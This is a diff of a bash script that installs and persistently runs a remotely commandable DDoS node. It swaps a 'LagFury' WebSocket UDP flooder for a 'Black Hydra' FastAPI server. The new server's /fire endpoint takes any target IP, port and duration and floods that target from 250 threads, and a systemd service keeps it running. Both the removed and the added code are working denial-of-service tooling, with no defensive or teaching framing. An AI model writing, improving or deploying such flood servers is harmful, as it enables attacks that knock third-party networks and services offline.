@@ -1,75 +1,83 @@
 #!/bin/bash
-# LagFury Deployment - Working UDP Flooder (Port 5000, Reliable and Validated)
 
-set -e
-
-INSTALL_DIR="/opt/lagfury"
-SERVICE_NAME="lagfury"
-PY_SCRIPT="ws_server.py"
-
-# Step 1: Environment Prep
 echo "[*] Installing dependencies..."
-apt update && apt install -y python3 python3-pip screen
-pip3 install websockets --force-reinstall
-mkdir -p "$INSTALL_DIR"
-cd "$INSTALL_DIR"
+sudo apt update && sudo apt install -y python3-pip python3-venv
 
-# Step 2: Deploy working ws_server.py
-cat > $PY_SCRIPT << 'EOF'
-import asyncio
-import websockets
-import json
+echo "[*] Setting up virtual environment..."
+python3 -m venv blackhydra_env
+source blackhydra_env/bin/activate
+
+echo "[*] Installing Python modules..."
+pip install fastapi uvicorn
+
+echo "[*] Creating attack server..."
+cat <<EOF > blackhydra_api.py
 import socket
-import random
+import threading
 import time
+from fastapi import FastAPI, HTTPException
+from pydantic import BaseModel
+import uvicorn
 
-async def handler(websocket, path):
-    async for message in websocket:
-        try:
-            print("[RECEIVED]", message)
-            data = json.loads(message)
-            if data.get("command") == "execute_attack":
-                ip = data["target_ip"]
-                port = int(data["target_port"])
-                duration = int(data["duration"])
-                if data["attack_type"] == "udp_flood":
-                    end = time.time() + duration
-                    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
-                    while time.time() < end:
-                        sock.sendto(random._urandom(1024), (ip, port))
-                await websocket.send("Attack complete.")
-        except Exception as e:
-            await websocket.send(f"Error: {e}")
+app = FastAPI()
 
-async def main():
-    async with websockets.serve(handler, "0.0.0.0", 5000):
-        print("[+] WebSocket server running on port 5000")
-        await asyncio.Future()
+class AttackPayload(BaseModel):
+    command: str
+    target_ip: str
+    target_port: int
+    attack_type: str
+    duration: int = 3
 
-asyncio.run(main())
+@app.post("/fire")
+def fire_attack(payload: AttackPayload):
+    if payload.command != "execute_attack" or payload.attack_type != "udp_flood":
+        raise HTTPException(status_code=400, detail="Unsupported or malformed request")
+
+    def burst_flood():
+        timeout = time.time() + payload.duration
+        def worker():
+            sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+            msg = socket.getrandbits(1024).to_bytes(128, 'big')
+            while time.time() < timeout:
+                try:
+                    sock.sendto(msg, (payload.target_ip, payload.target_port))
+                except:
+                    break
+            sock.close()
+
+        threads = [threading.Thread(target=worker) for _ in range(250)]
+        for t in threads:
+            t.start()
+        for t in threads:
+            t.join()
+
+    threading.Thread(target=burst_flood, daemon=True).start()
+    return {"status": "attack_dispatched", "target": payload.target_ip, "port": payload.target_port, "duration": payload.duration}
+
+if __name__ == "__main__":
+    uvicorn.run(app, host="0.0.0.0", port=5000)
 EOF
 
-# Step 3: Create Systemd Service
-cat > /etc/systemd/system/${SERVICE_NAME}.service << EOF
+echo "[*] Creating systemd service..."
+cat <<EOF | sudo tee /etc/systemd/system/blackhydra.service
 [Unit]
-Description=LagFury UDP Node (Port 5000)
+Description=Black Hydra API Server
 After=network.target
 
 [Service]
-ExecStart=/usr/bin/python3 $INSTALL_DIR/$PY_SCRIPT
-WorkingDirectory=$INSTALL_DIR
+User=$USER
+WorkingDirectory=$(pwd)
+ExecStart=$(pwd)/blackhydra_env/bin/python $(pwd)/blackhydra_api.py
 Restart=always
-User=root
 
 [Install]
 WantedBy=multi-user.target
 EOF
 
-# Step 4: Enable & Launch
-echo "[*] Enabling service..."
-systemctl daemon-reexec
-systemctl daemon-reload
-systemctl enable $SERVICE_NAME
-systemctl restart $SERVICE_NAME
+echo "[*] Enabling and starting service..."
+sudo systemctl daemon-reexec
+sudo systemctl daemon-reload
+sudo systemctl enable blackhydra.service
+sudo systemctl start blackhydra.service
 
-echo "[+] LagFury node running on port 5000 is deployed and operational."
+echo "[+] Black Hydra API is live on port 5000"
